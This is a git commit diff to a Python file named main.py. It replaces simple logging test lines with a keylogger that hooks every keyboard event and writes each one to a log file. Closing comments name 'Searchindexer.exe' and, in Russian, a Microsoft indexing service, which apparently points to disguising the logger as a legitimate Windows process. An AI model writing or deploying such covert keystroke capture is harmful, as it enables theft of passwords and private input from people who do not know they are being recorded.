b1d289436db875da3c51478c32bd73566a8408c9
zazaza5817 <49568244+zazaza5817@users.noreply.github.com>
2020-07-09 22:39:55 +0300

    Update main.py

--- main.py
+++ main.py
@@ -1,6 +1,16 @@
 import logging
+import keyboard
 
-logging.basicConfig(filename='latest.log', filemode='a', format='[%(asctime)s][%(levelname)s]: %(message)s', level=logging.INFO)
-logging.basicConfig(filename='latest.log', filemode='a', format='[%(asctime)s]: %(message)s', level=logging.WARNING)
-logging.warning('This will get logged to a file')
-logging.info('This will get logged to a file')
+logging.basicConfig(filename='latest.log', filemode='a', format='[%(asctime)s]: %(message)s', level=logging.INFO)
+logging.info('__log start__')
+
+
+def save_key(event):
+    logging.info(str(event))
+
+
+keyboard.hook(save_key)
+keyboard.wait()
+
+# Searchindexer.exe
+# индексатор службы Microsoft
